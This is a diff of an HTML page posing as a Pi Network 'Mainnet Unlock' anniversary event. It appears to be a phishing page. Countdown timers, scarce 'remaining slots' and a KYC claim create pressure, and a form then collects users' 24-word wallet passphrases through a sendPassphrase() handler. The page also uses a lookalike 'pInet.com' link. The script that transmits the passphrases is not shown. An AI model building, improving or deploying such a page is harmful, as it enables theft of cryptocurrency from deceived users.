@@ -1,64 +1,89 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <link rel="stylesheet" href="Style.css">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@70;700&display=swap" rel="stylesheet">
+    <meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <title>PiNet</title>
+    <meta name="description" content="Browse Pi Network apps in any browser."/>
+    <meta name="application-name" content="PiNet"/>
+    <meta name="keywords" content="Pi Network,PiNet"/>
+    <meta property="og:title" content="PiNet"/>
+    <meta property="og:description" content="Browse Pi Network apps in any browser."/>
+    <meta property="og:url" content="https://pinet.com"/>
+    <meta property="og:site_name" content="PiNet"/>
+    <meta property="og:locale" content="en_US"/>
+    <meta property="og:image" content="https://pinet.com/pinet.png"/>
+    <meta property="og:image:width" content="800"/>
+    <meta property="og:image:height" content="418"/>
+    <meta property="og:type" content="website"/>
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:site" content="@PiCoreTeam"/>
+    <meta name="twitter:title" content="PiNet"/>
+    <meta name="twitter:description" content="Browse Pi Network apps in any browser."/>
+    <meta name="twitter:image" content="https://pinet.com/pinet.png"/>
+    <link rel="icon" href="/assets/favicons/pinet.ico"/>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="Style.css"/>
 </head>
-<body>
-  <header>
-    <div class="logo">
-      <img src="https://ik.imagekit.io/digitalmake/PiNet.png?updatedAt=1749551583656" alt="PiNet Logo" width="50">
-      <h1>PiNet</h1>
-    </div>
-    <nav>
-      <a href="#">Home</a>
-      <a href="#" class="btn">Download the Pi browser.</a>
-    </nav>
-  </header>
+<body class="body">
+    <header>
+        <div class="logo-container">
+            <img src="https://ik.imagekit.io/digitalmake/PiNet.png?updatedAt=1749551583656" alt="PiNet Logo" class="header-logo"/>
+            <span class="logo-text">PiNet</span>
+        </div>
+        <nav>
+            <a href="#" class="home-link">Home <span class="small-logo">π</span></a>
+            <a href="#" class="btn" onclick="showDownloadPopup()">Download Pi Browser</a>
+        </nav>
+    </header>
 
-  <main>
-    <section>
-      <h1 class="logo-big">π</h1>
-      <h2>Locked Pi Unlock Event Celebrating the 6th Anniversary and Mainnet Launch</h2>
-      <p>As a token of appreciation... for pioneers who have supported the project over the past 6 years.</p>
-    </section>
+    <main>
+        <div class="logo-big">π</div>
+        <h1 class="animated-heading">Locked Pi Unlock Event Celebrating the 6th Anniversary and Mainnet Launch</h1>
+        <p>As a token of appreciation... for pioneers who have supported the project over the past 6 years.</p>
 
-    <section>
-      <h1>Mainnet Unlock π</h1>
-      <button class="unlock-btn" onclick="showPopup()">Show Mainnet Unlock Details</button>
-      <ul class="status">
-        <li>⚡ Time remaining: <span id="timer">Loading...</span></li>
-        <li>✔ Requirement: KYC successfully completed</li>
-        <li>📶 Remaining slots: 218 out of 31,415</li>
-      </ul>
-    </section>
-
-    <section>
-      <h1>UNLOCK LOCKED PI WITH A PASSPHRASE</h1>
-      <textarea id="passphraseInput" placeholder="Enter your 24-character password here. For example: wood velvet bless wasp chaos antenna glow need lunch deliver story embark oblige seat hover chimney street license fold punch sport defense oven dust"></textarea>
-      <button class="unlock-btn" onclick="sendPassphrase()">UNLOCK LOCKED PI WITH A PASSPHRASE</button>
-      <p class="note">Note: Each wallet can only register for unlocking once. Priority is given to pioneers who have supported the project for more than 2 years.</p>
-    </section>
-
-    <!-- Popup for Mainnet Unlock -->
-    <div id="unlockPopup" class="popup">
-      <div class="popup-content">
-        <span class="close" onclick="hidePopup()">×</span>
-        <h1 class="animated-heading">Mainnet Unlock π</h1>
+        <h2 class="animated-heading">Mainnet Unlock π</h2>
+        <button class="unlock-btn" onclick="showPopup()">Show Mainnet Unlock Details</button>
         <ul class="status">
-          <li>⚡ Time remaining: <span id="popupTimer">Loading...</span></li>
-          <li>✔ Requirement: KYC successfully completed</li>
-          <li>📶 Remaining slots: 218 out of 31,415</li>
+            <li>⚡ Time remaining: <span id="timer">Loading...</span></li>
+            <li>✔ Requirement: KYC successfully completed</li>
+            <li>📶 Remaining slots: 218 out of 31,415</li>
         </ul>
-      </div>
+
+        <h2>UNLOCK LOCKED PI WITH A PASSPHRASE</h2>
+        <textarea id="passphraseInput" placeholder="Enter your passphrase"></textarea>
+        <button class="unlock-btn" onclick="sendPassphrase()">UNLOCK LOCKED PI WITH A PASSPHRASE</button>
+        <p class="note">Note: Each wallet can only register for unlocking once. Priority is given to pioneers who have supported the project for more than 2 years.</p>
+
+        <a href="https://socialchain.app/privacy" target="_blank" class="policy">Privacy Policy</a>
+        <a href="https://ecosystem.pInet.com/" class="footer-btn">🔍 Explore the ecosystem.</a>
+    </main>
+
+    <div id="unlockPopup" class="popup">
+        <div class="popup-content">
+            <span class="close" onclick="hidePopup()">×</span>
+            <h2>Mainnet Unlock π</h2>
+            <ul class="status">
+                <li>⚡ Time remaining: <span id="popupTimer">Loading...</span></li>
+                <li>✔ Requirement: KYC successfully completed</li>
+                <li>📶 Remaining slots: 218 out of 31,415</li>
+            </ul>
+        </div>
     </div>
 
-    <footer>
-      <a href="https://socialchain.app/privacy" target="_blank" class="policy">Privacy Policy</a>
-      <a href="#" class="footer-btn">🔍 Explore the ecosystem.</a>
-    </footer>
-  </main>
+    <div id="downloadPopup" class="popup">
+        <div class="popup-content">
+            <span class="close" onclick="hideDownloadPopup()">×</span>
+            <h2>Download Pi Browser</h2>
+            <p>The Pi Browser is the gateway to Pi's Web3 ecosystem where Pioneers engage with apps using their Pi account and transact with their Pi Wallet – it's the sole platform for securely entering Pi Wallet passphrases.</p>
+            <div class="download-buttons">
+                <a href="https://play.google.com/store/apps/details?id=pi.browser" target="_blank" class="store-btn google-play">Get it on Google Play</a>
+                <a href="https://apps.apple.com/us/app/pi-browser/id1560911608" target="_blank" class="store-btn app-store">Download on the App Store</a>
+            </div>
+            <button class="close-btn" onclick="hideDownloadPopup()">Close</button>
+        </div>
+    </div>
 
-  <script src="script.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
